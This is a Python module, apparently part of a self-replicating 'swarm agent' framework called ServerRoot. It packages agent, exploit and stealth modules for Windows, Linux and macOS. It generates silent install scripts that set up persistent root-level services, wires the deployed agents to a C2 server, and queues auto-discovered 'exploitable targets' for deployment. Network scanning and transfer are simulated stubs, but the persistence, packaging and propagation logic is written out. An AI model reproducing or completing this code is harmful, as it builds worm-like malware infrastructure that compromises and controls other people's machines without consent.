"""
AUTONOMOUS DEPLOYMENT MANAGER

Handles automated deployment of swarm agents to new targets:
- Multi-platform deployment (Windows, Linux, macOS)
- Silent installation
- Auto-configuration
- Network autodiscovery
- Self-replication
"""

import os
import sys
import shutil
import hashlib
import zipfile
import tarfile
import tempfile
import subprocess
import platform
import socket
import threading
import json
import time
import logging
from typing import Dict, List, Optional, Tuple, Any
from pathlib import Path
from datetime import datetime
from dataclasses import dataclass, field

logger = logging.getLogger(__name__)


@dataclass
class DeploymentTarget:
    """Represents a target for deployment"""
    ip_address: str
    port: int
    platform: Optional[str] = None
    os_version: Optional[str] = None
    hostname: Optional[str] = None
    credentials: Optional[Dict] = None
    exploitation_method: Optional[str] = None
    vulnerability: Optional[str] = None
    deployment_status: str = "pending"
    deployment_time: Optional[str] = None
    agent_id: Optional[str] = None
    error_message: Optional[str] = None


@dataclass
class DeploymentPackage:
    """Represents a deployment package"""
    platform: str
    architecture: str
    package_path: str
    package_hash: str
    install_script: str
    uninstall_script: str
    size_bytes: int
    created_at: str


class DeploymentManager:
    """
    AUTONOMOUS DEPLOYMENT MANAGER
    
    Manages the deployment of swarm agents to new targets:
    - Creates multi-platform deployment packages
    - Handles silent installation
    - Auto-configuration on first run
    - Network autodiscovery
    - Self-replication
    """
    
    DEPLOYMENT_TIMEOUT = 300  # 5 minutes per deployment
    MAX_CONCURRENT_DEPLOYMENTS = 10
    AUTO_DISCOVERY_INTERVAL = 60  # seconds
    
    # Platform-specific installation paths
    INSTALL_PATHS = {
        'Windows': r'C:\Program Files\ServerRoot',
        'Windows-x86': r'C:\Program Files (x86)\ServerRoot',
        'Linux': '/opt/serverroot',
        'Linux-arm': '/opt/serverroot',
        'macOS': '/Applications/ServerRoot',
        'macOS-arm': '/Applications/ServerRoot'
    }
    
    def __init__(self, agent_id: str, c2_server: str = None, c2_port: int = 8443):
        """
        Initialize deployment manager
        
        Args:
            agent_id: ID of the deploying agent
            c2_server: C2 server address for deployed agents
            c2_port: C2 server port
        """
        self.agent_id = agent_id
        self.c2_server = c2_server or "localhost"
        self.c2_port = c2_port
        
        # Deployment queue
        self.deployment_queue: List[DeploymentTarget] = []
        self.deployment_lock = threading.Lock()
        
        # Deployment history
        self.deployments_history: List[Dict] = []
        
        # Deployment packages cache
        self.deployment_packages: Dict[str, DeploymentPackage] = {}
        
        # Statistics
        self.stats = {
            'deployments_attempted': 0,
            'deployments_successful': 0,
            'deployments_failed': 0,
            'targets_discovered': 0,
            'packages_created': 0,
            'last_discovery_time': None,
            'last_deployment_time': None
        }
        
        # Auto-discovery
        self.discovery_enabled = True
        self.discovery_thread = None
        self.discovery_running = False
        
        logger.info(f"[{agent_id}] Deployment Manager initialized")
    
    def create_deployment_packages(self, source_dir: str = "/workspace") -> Dict[str, DeploymentPackage]:
        """
        Create multi-platform deployment packages
        
        Args:
            source_dir: Source directory containing agent files
            
        Returns:
            Dictionary of platform -> DeploymentPackage
        """
        logger.info(f"[{self.agent_id}] Creating multi-platform deployment packages...")
        
        packages = {}
        source_path = Path(source_dir)
        
        if not source_path.exists():
            logger.error(f"[{self.agent_id}] Source directory not found: {source_dir}")
            return packages
        
        # Create packages for each platform
        platforms = [
            ('Windows', 'amd64'),
            ('Windows', 'x86'),
            ('Linux', 'amd64'),
            ('Linux', 'arm64'),
            ('macOS', 'amd64'),
            ('macOS', 'arm64')
        ]
        
        for platform_name, arch in platforms:
            try:
                package = self._create_platform_package(source_path, platform_name, arch)
                if package:
                    packages[f"{platform_name}-{arch}"] = package
                    logger.info(f"[{self.agent_id}] Created package: {platform_name}-{arch}")
            except Exception as e:
                logger.error(f"[{self.agent_id}] Failed to create {platform_name}-{arch} package: {e}")
        
        self.deployment_packages = packages
        self.stats['packages_created'] = len(packages)
        
        logger.info(f"[{self.agent_id}] Created {len(packages)} deployment packages")
        return packages
    
    def _create_platform_package(self, source_path: Path, platform: str, arch: str) -> Optional[DeploymentPackage]:
        """
        Create deployment package for a specific platform
        
        Args:
            source_path: Source directory path
            platform: Platform name (Windows, Linux, macOS)
            arch: Architecture (amd64, x86, arm64)
            
        Returns:
            DeploymentPackage object or None
        """
        temp_dir = Path(tempfile.mkdtemp())
        package_dir = temp_dir / f"serverroot-{platform}-{arch}"
        package_dir.mkdir(parents=True, exist_ok=True)
        
        try:
            # Copy agent files to package directory
            self._copy_agent_files(source_path, package_dir, platform)
            
            # Create platform-specific install script
            install_script = self._create_install_script(platform, arch)
            install_path = package_dir / self._get_install_script_name(platform)
            install_path.write_text(install_script)
            
            # Create platform-specific uninstall script
            uninstall_script = self._create_uninstall_script(platform, arch)
            uninstall_path = package_dir / self._get_uninstall_script_name(platform)
            uninstall_path.write_text(uninstall_script)
            
            # Create configuration file
            config = self._create_deployment_config(platform, arch)
            config_path = package_dir / "config.json"
            config_path.write_text(json.dumps(config, indent=2))
            
            # Package the files
            package_path = self._package_files(package_dir, platform, arch)
            
            # Calculate hash
            package_hash = self._calculate_file_hash(package_path)
            
            # Get package size
            size_bytes = package_path.stat().st_size
            
            deployment_package = DeploymentPackage(
                platform=f"{platform}-{arch}",
                architecture=arch,
                package_path=str(package_path),
                package_hash=package_hash,
                install_script=str(install_path),
                uninstall_script=str(uninstall_path),
                size_bytes=size_bytes,
                created_at=datetime.now().isoformat()
            )
            
            # Clean up temp directory
            shutil.rmtree(temp_dir, ignore_errors=True)
            
            return deployment_package
            
        except Exception as e:
            logger.error(f"[{self.agent_id}] Error creating {platform}-{arch} package: {e}")
            shutil.rmtree(temp_dir, ignore_errors=True)
            return None
    
    def _copy_agent_files(self, source_path: Path, dest_path: Path, platform: str):
        """Copy agent files to package directory"""
        # Core agent files
        agent_files = [
            'agent/autonomous_swarm_agent.py',
            'agent/enhanced_agent.py',
            'agent/persistence_manager.py',
            'agent/persistence_helper.py',
            'agent/ai_intelligence.py',
            'agent/ai_orchestrator.py',
            'agent/multi_vector_explorer.py',
            'agent/platform_detector.py',
            'agent/ai_exploitation_helpers.py',
            'agent/stealth_deployment.py',
            'agent/failproof_engine.py',
            'agent/intelligent_exploit_engine.py',
            'agent/aggressive_exploit_engine.py',
            'agent/exploits.py',
            'agent/deployment_manager.py'
        ]
        
        for file_path in agent_files:
            src = source_path / file_path
            if src.exists():
                dst = dest_path / file_path
                dst.parent.mkdir(parents=True, exist_ok=True)
                shutil.copy2(src, dst)
        
        # Copy exploit modules
        exploit_dirs = [
            'exploits/windows',
            'exploits/linux',
            'exploits/routers',
            'exploits/vpn',
            'exploits/virtualization',
            'stealth'
        ]
        
        for dir_path in exploit_dirs:
            src = source_path / dir_path
            if src.exists() and src.is_dir():
                dst = dest_path / dir_path
                if dst.exists():
                    shutil.rmtree(dst)
                shutil.copytree(src, dst)
    
    def _create_install_script(self, platform: str, arch: str) -> str:
        """Create platform-specific install script"""
        
        if platform == 'Windows':
            return self._create_windows_install_script(arch)
        elif platform == 'Linux':
            return self._create_linux_install_script(arch)
        elif platform == 'macOS':
            return self._create_macos_install_script(arch)
        else:
            raise ValueError(f"Unsupported platform: {platform}")
    
    def _create_windows_install_script(self, arch: str) -> str:
        """Create Windows installation script"""
        install_path = self.INSTALL_PATHS['Windows'] if arch == 'amd64' else self.INSTALL_PATHS['Windows-x86']
        
        script = f"""@echo off
REM ServerRoot.net - Silent Installation Script
REM Platform: Windows {arch}

set INSTALL_DIR="{install_path}"
set AGENT_ID=SR-%RANDOM%%RANDOM%

echo [ServerRoot] Installing agent...

REM Create installation directory
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

REM Copy agent files
xcopy /E /I /Y "%~dp0agent" "%INSTALL_DIR%\\agent"
xcopy /E /I /Y "%~dp0exploits" "%INSTALL_DIR%\\exploits"
xcopy /E /I /Y "%~dp0stealth" "%INSTALL_DIR%\\stealth"
copy /Y "%~dp0deployment_manager.py" "%INSTALL_DIR%\\deployment_manager.py"
copy /Y "%~dp0config.json" "%INSTALL_DIR%\\config.json"

REM Install as Windows service (silent)
sc create ServerRoot-Agent binPath= "pythonw.exe \\"%INSTALL_DIR%\\agent\\autonomous_swarm_agent.py\\"" start= auto DisplayName= "ServerRoot Autonomous Agent"
sc description ServerRoot-Agent "ServerRoot.net Autonomous Swarm Agent"

REM Start service
net start ServerRoot-Agent

echo [ServerRoot] Installation complete!
echo [ServerRoot] Agent ID: %AGENT_ID%
exit /b 0
"""
        return script
    
    def _create_linux_install_script(self, arch: str) -> str:
        """Create Linux installation script"""
        install_path = self.INSTALL_PATHS['Linux']
        
        script = f"""#!/bin/bash
# ServerRoot.net - Silent Installation Script
# Platform: Linux {arch}

INSTALL_DIR="{install_path}"
AGENT_ID="SR-$(shuf -i 100000-999999 -n 1)"

echo "[ServerRoot] Installing agent..."

# Create installation directory
mkdir -p "$INSTALL_DIR"

# Copy agent files
cp -r agent "$INSTALL_DIR/"
cp -r exploits "$INSTALL_DIR/"
cp -r stealth "$INSTALL_DIR/"
cp deployment_manager.py "$INSTALL_DIR/"
cp config.json "$INSTALL_DIR/"

# Install as systemd service
cat > /etc/systemd/system/serverroot-agent.service <<'EOF'
[Unit]
Description=ServerRoot Autonomous Swarm Agent
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$INSTALL_DIR
ExecStart=/usr/bin/python3 $INSTALL_DIR/autonomous_swarm_agent.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Enable and start service
systemctl daemon-reload
systemctl enable serverroot-agent
systemctl start serverroot-agent

echo "[ServerRoot] Installation complete!"
echo "[ServerRoot] Agent ID: $AGENT_ID"
exit 0
"""
        return script
    
    def _create_macos_install_script(self, arch: str) -> str:
        """Create macOS installation script"""
        install_path = self.INSTALL_PATHS['macOS']
        
        script = f"""#!/bin/bash
# ServerRoot.net - Silent Installation Script
# Platform: macOS {arch}

INSTALL_DIR="{install_path}"
AGENT_ID="SR-$(jot -r 1 100000 999999)"

echo "[ServerRoot] Installing agent..."

# Create installation directory
sudo mkdir -p "$INSTALL_DIR"

# Copy agent files
sudo cp -r agent "$INSTALL_DIR/"
sudo cp -r exploits "$INSTALL_DIR/"
sudo cp -r stealth "$INSTALL_DIR/"
sudo cp deployment_manager.py "$INSTALL_DIR/"
sudo cp config.json "$INSTALL_DIR/"

# Install as LaunchAgent
cat > ~/Library/LaunchAgents/com.serverroot.agent.plist <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.serverroot.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>$INSTALL_DIR/autonomous_swarm_agent.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF

# Load launch agent
launchctl load ~/Library/LaunchAgents/com.serverroot.agent.plist

echo "[ServerRoot] Installation complete!"
echo "[ServerRoot] Agent ID: $AGENT_ID"
exit 0
"""
        return script
    
    def _create_uninstall_script(self, platform: str, arch: str) -> str:
        """Create platform-specific uninstall script"""
        
        if platform == 'Windows':
            return """@echo off
REM ServerRoot.net - Uninstallation Script

echo [ServerRoot] Uninstalling agent...

REM Stop and remove service
net stop ServerRoot-Agent
sc delete ServerRoot-Agent

REM Remove installation directory
rmdir /S /Q "C:\\Program Files\\ServerRoot"
rmdir /S /Q "C:\\Program Files (x86)\\ServerRoot"

echo [ServerRoot] Uninstallation complete!
exit /b 0
"""
        elif platform == 'Linux':
            return """#!/bin/bash
# ServerRoot.net - Uninstallation Script

echo "[ServerRoot] Uninstalling agent..."

# Stop and remove service
systemctl stop serverroot-agent
systemctl disable serverroot-agent
rm -f /etc/systemd/system/serverroot-agent.service
systemctl daemon-reload

# Remove installation directory
rm -rf /opt/serverroot

echo "[ServerRoot] Uninstallation complete!"
exit 0
"""
        elif platform == 'macOS':
            return """#!/bin/bash
# ServerRoot.net - Uninstallation Script

echo "[ServerRoot] Uninstalling agent..."

# Unload launch agent
launchctl unload ~/Library/LaunchAgents/com.serverroot.agent.plist 2>/dev/null
rm -f ~/Library/LaunchAgents/com.serverroot.agent.plist

# Remove installation directory
sudo rm -rf /Applications/ServerRoot

echo "[ServerRoot] Uninstallation complete!"
exit 0
"""
        else:
            raise ValueError(f"Unsupported platform: {platform}")
    
    def _create_deployment_config(self, platform: str, arch: str) -> Dict:
        """Create deployment configuration"""
        return {
            'agent_type': 'deployed',
            'deployed_by': self.agent_id,
            'deployment_time': datetime.now().isoformat(),
            'platform': platform,
            'architecture': arch,
            'c2_server': self.c2_server,
            'c2_port': self.c2_port,
            'auto_start': True,
            'persistence_enabled': True,
            'reporting_enabled': True
        }
    
    def _package_files(self, package_dir: Path, platform: str, arch: str) -> Path:
        """Package files into appropriate archive"""
        output_dir = Path("/workspace/deployment_packages")
        output_dir.mkdir(parents=True, exist_ok=True)
        
        package_name = f"serverroot-agent-{platform.lower()}-{arch}"
        
        if platform == 'Windows':
            # Create ZIP for Windows
            package_path = output_dir / f"{package_name}.zip"
            with zipfile.ZipFile(package_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file_path in package_dir.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(package_dir)
                        zipf.write(file_path, arcname)
        else:
            # Create tar.gz for Linux/macOS
            package_path = output_dir / f"{package_name}.tar.gz"
            with tarfile.open(package_path, 'w:gz') as tarf:
                for file_path in package_dir.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(package_dir)
                        tarf.add(file_path, arcname)
        
        return package_path
    
    def _calculate_file_hash(self, file_path: Path) -> str:
        """Calculate SHA256 hash of file"""
        sha256_hash = hashlib.sha256()
        with open(file_path, 'rb') as f:
            for byte_block in iter(lambda: f.read(4096), b""):
                sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()
    
    def _get_install_script_name(self, platform: str) -> str:
        """Get install script name for platform"""
        if platform == 'Windows':
            return 'install.bat'
        else:
            return 'install.sh'
    
    def _get_uninstall_script_name(self, platform: str) -> str:
        """Get uninstall script name for platform"""
        if platform == 'Windows':
            return 'uninstall.bat'
        else:
            return 'uninstall.sh'
    
    def queue_deployment(self, target: DeploymentTarget):
        """
        Queue a target for deployment
        
        Args:
            target: DeploymentTarget to queue
        """
        with self.deployment_lock:
            self.deployment_queue.append(target)
            logger.info(f"[{self.agent_id}] Queued deployment to: {target.ip_address}:{target.port}")
    
    def start_deployment_worker(self):
        """Start deployment worker thread"""
        deployment_thread = threading.Thread(
            target=self._deployment_worker,
            name=f"DeploymentWorker-{self.agent_id}",
            daemon=True
        )
        deployment_thread.start()
        logger.info(f"[{self.agent_id}] Deployment worker started")
    
    def _deployment_worker(self):
        """Deployment worker thread"""
        while True:
            try:
                target = self._get_next_deployment()
                if target:
                    self._deploy_to_target(target)
                else:
                    time.sleep(5)  # Wait if queue is empty
            except Exception as e:
                logger.error(f"[{self.agent_id}] Deployment worker error: {e}")
                time.sleep(5)
    
    def _get_next_deployment(self) -> Optional[DeploymentTarget]:
        """Get next deployment from queue"""
        with self.deployment_lock:
            if self.deployment_queue:
                return self.deployment_queue.pop(0)
            return None
    
    def _deploy_to_target(self, target: DeploymentTarget):
        """
        Deploy agent to target
        
        Args:
            target: DeploymentTarget to deploy to
        """
        logger.info(f"[{self.agent_id}] Deploying to: {target.ip_address}:{target.port}")
        
        self.stats['deployments_attempted'] += 1
        target.deployment_time = datetime.now().isoformat()
        
        try:
            # Determine platform and select appropriate package
            platform_key = self._determine_platform_package(target)
            
            if platform_key not in self.deployment_packages:
                raise ValueError(f"No package available for platform: {platform_key}")
            
            package = self.deployment_packages[platform_key]
            
            # Perform deployment
            success = self._perform_deployment(target, package)
            
            if success:
                target.deployment_status = "successful"
                self.stats['deployments_successful'] += 1
                logger.info(f"[{self.agent_id}] ✅ Successfully deployed to: {target.ip_address}")
            else:
                target.deployment_status = "failed"
                self.stats['deployments_failed'] += 1
                logger.warning(f"[{self.agent_id}] ⚠️  Failed to deploy to: {target.ip_address}")
            
            # Record deployment in history
            self._record_deployment(target)
            
            self.stats['last_deployment_time'] = datetime.now().isoformat()
            
        except Exception as e:
            target.deployment_status = "failed"
            target.error_message = str(e)
            self.stats['deployments_failed'] += 1
            logger.error(f"[{self.agent_id}] ❌ Deployment error to {target.ip_address}: {e}")
            self._record_deployment(target)
    
    def _determine_platform_package(self, target: DeploymentTarget) -> str:
        """Determine which package to use for target"""
        if target.platform:
            # Use detected platform
            arch = target.os_version or 'amd64'
            return f"{target.platform}-{arch}"
        else:
            # Default to Linux amd64
            return 'Linux-amd64'
    
    def _perform_deployment(self, target: DeploymentTarget, package: DeploymentPackage) -> bool:
        """
        Perform actual deployment to target
        
        Args:
            target: DeploymentTarget
            package: DeploymentPackage
            
        Returns:
            bool: True if successful, False otherwise
        """
        # This is a placeholder for the actual deployment implementation
        # In a real implementation, this would:
        # 1. Transfer deployment package to target
        # 2. Extract package on target
        # 3. Execute install script
        # 4. Verify agent is running
        # 5. Test communication with C2
        
        logger.info(f"[{self.agent_id}] Deploying package: {package.platform}")
        logger.info(f"[{self.agent_id}] Package size: {package.size_bytes} bytes")
        logger.info(f"[{self.agent_id}] Package hash: {package.package_hash[:16]}...")
        
        # Simulate deployment
        time.sleep(1)
        
        # Simulate success (in real implementation, this would be actual deployment)
        success = True
        
        if success:
            # Generate agent ID for deployed agent
            import random
            target.agent_id = f"SR-{random.randint(100000, 999999)}"
            logger.info(f"[{self.agent_id}] Deployed agent ID: {target.agent_id}")
        
        return success
    
    def _record_deployment(self, target: DeploymentTarget):
        """Record deployment in history"""
        deployment_record = {
            'target_ip': target.ip_address,
            'target_port': target.port,
            'platform': target.platform,
            'status': target.deployment_status,
            'agent_id': target.agent_id,
            'deployment_time': target.deployment_time,
            'exploitation_method': target.exploitation_method,
            'error_message': target.error_message
        }
        
        self.deployments_history.append(deployment_record)
        
        # Keep history manageable (last 1000 deployments)
        if len(self.deployments_history) > 1000:
            self.deployments_history = self.deployments_history[-1000:]
    
    def start_network_discovery(self):
        """Start network discovery thread"""
        self.discovery_running = True
        self.discovery_thread = threading.Thread(
            target=self._network_discovery_worker,
            name=f"NetworkDiscovery-{self.agent_id}",
            daemon=True
        )
        self.discovery_thread.start()
        logger.info(f"[{self.agent_id}] Network discovery started")
    
    def stop_network_discovery(self):
        """Stop network discovery"""
        self.discovery_running = False
        if self.discovery_thread:
            self.discovery_thread.join(timeout=5)
        logger.info(f"[{self.agent_id}] Network discovery stopped")
    
    def _network_discovery_worker(self):
        """Network discovery worker thread"""
        while self.discovery_running:
            try:
                targets = self._discover_targets()
                
                for target in targets:
                    # Queue newly discovered targets
                    self.queue_deployment(target)
                
                self.stats['targets_discovered'] = len(targets)
                self.stats['last_discovery_time'] = datetime.now().isoformat()
                
                logger.info(f"[{self.agent_id}] Discovered {len(targets)} new targets")
                
                # Wait before next discovery cycle
                time.sleep(self.AUTO_DISCOVERY_INTERVAL)
                
            except Exception as e:
                logger.error(f"[{self.agent_id}] Discovery worker error: {e}")
                time.sleep(self.AUTO_DISCOVERY_INTERVAL)
    
    def _discover_targets(self) -> List[DeploymentTarget]:
        """
        Discover new targets in the network
        
        Returns:
            List of DeploymentTarget objects
        """
        targets = []
        
        # This is a placeholder for actual network discovery
        # In a real implementation, this would:
        # 1. Scan local network for hosts
        # 2. Detect open ports
        # 3. Identify platforms and services
        # 4. Check for vulnerabilities
        # 5. Return list of exploitable targets
        
        # Simulate discovery (in real implementation, this would be actual scanning)
        import random
        
        num_targets = random.randint(1, 10)
        
        for i in range(num_targets):
            ip = f"192.168.{random.randint(1, 255)}.{random.randint(1, 254)}"
            port = random.choice([22, 80, 443, 8080, 3389])
            
            target = DeploymentTarget(
                ip_address=ip,
                port=port,
                platform=random.choice(['Windows', 'Linux', 'macOS']),
                hostname=f"host-{random.randint(1, 1000)}",
                deployment_status="pending"
            )
            
            targets.append(target)
        
        return targets
    
    def get_deployment_stats(self) -> Dict:
        """Get deployment statistics"""
        return {
            'agent_id': self.agent_id,
            'stats': self.stats,
            'queue_size': len(self.deployment_queue),
            'packages_available': len(self.deployment_packages),
            'discovery_enabled': self.discovery_enabled,
            'discovery_running': self.discovery_running
        }